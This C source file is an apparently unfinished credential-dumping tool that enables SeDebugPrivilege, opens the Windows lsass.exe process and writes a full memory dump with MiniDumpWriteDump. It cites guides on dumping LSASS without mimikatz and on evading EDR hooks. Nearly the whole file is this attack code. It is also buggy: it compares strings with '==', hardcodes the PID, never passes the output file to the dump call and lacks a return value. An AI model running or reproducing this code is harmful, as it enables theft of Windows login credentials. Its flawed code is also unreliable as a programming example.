#include "header.h"
// https://www.youtube.com/watch?v=mI3FgE1K4PE&list=PLEQL8X1EIhuMGl9dT0u-9MKDMOHFtCdmg&index=20&t=169s&ab_channel=HichamElAaouad
// https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
// https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6

EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);

BOOL isElevatedProcess() {
	BOOL isElevated = FALSE;
	HANDLE access_token;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
		TOKEN_ELEVATION elevation;
		DWORD token_check = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
			isElevated = elevation.TokenIsElevated;
		}
	}
	if (access_token) {
		CloseHandle(access_token);
	}
	return isElevated;
}

DWORD GetProcessIDByName(const char* processName) {
	DWORD processID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &processEntry)) {
			do {
				char* currentProcessName = processEntry.szExeFile;
				printf("%s %s\n", currentProcessName, processName);
				if (currentProcessName == processName) {
					processID = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}
	return processID;
}
BOOL setPrivilege() {
	const wchar_t* privName = L"SeDebugPrivilege";
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE tokenPriv = NULL;
	LUID luid = { 0,0 };
	BOOL status = TRUE;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv)) {
		status = FALSE;
		goto EXIT;
	}
	if (!LookupPrivilegeValueW(0, privName, &luid)) {
		status = FALSE;
		goto EXIT;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(tokenPriv, FALSE, &priv, 0, 0, 0)) {
		status = FALSE;
		goto EXIT;
	}
EXIT:
	if (tokenPriv) {
		CloseHandle(tokenPriv);
		return status;
	}
	return status;
}


BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
) {

	//LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
	//DWORD bytesRead = 0;

	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		printf("INIT\n");
		callbackOutput->Status = S_FALSE;
		break;
	case IoWriteAllCallback:
		printf("DATA\n");
		callbackOutput->Status = S_OK;
		/*source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;
		RtlCopyMemory(destination, source, bufferSize);*/
		break;

	case IoFinishCallback:
		printf("END\n");
		callbackOutput->Status = S_OK;
		break;

	default:
		return TRUE;
	}
	return TRUE;
}
int main_mimikatz(int argc, char *argv[]) {
	if (isElevatedProcess()) {
		printf("We have the required privileges\n");
	}
	else {
		printf("We don't have the required privileges\n");
		return 0;
	}

	char* processName = "lsass.exe";
	DWORD processPID = 2032;
	printf("lsasspid process PID is %d\n", processPID);

	if (setPrivilege()) {
		printf("seDebugPrivilege is enabled\n");
	}
	else {
		printf("seDebugPrivilege is not enabled\n");
		return 0;
	}

	LPCSTR fileName_pointer = "lsass.dump";
	HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
	HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);

	if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
		//patchme();
		printf("in the place\n");

		MINIDUMP_CALLBACK_INFORMATION callbackInfo;
		ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
		callbackInfo.CallbackRoutine = &minidumpCallback;
		callbackInfo.CallbackParam = NULL;
		BOOL isDump = MiniDumpWriteDump(processHandler, processPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
		//BOOL isDump = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
		if (isDump) {
			printf("[+] lsass is dumped\n");
		}
		else {
			printf("[-] lsass is not dumped\n");
		}
	}
}
/**************************************************************************/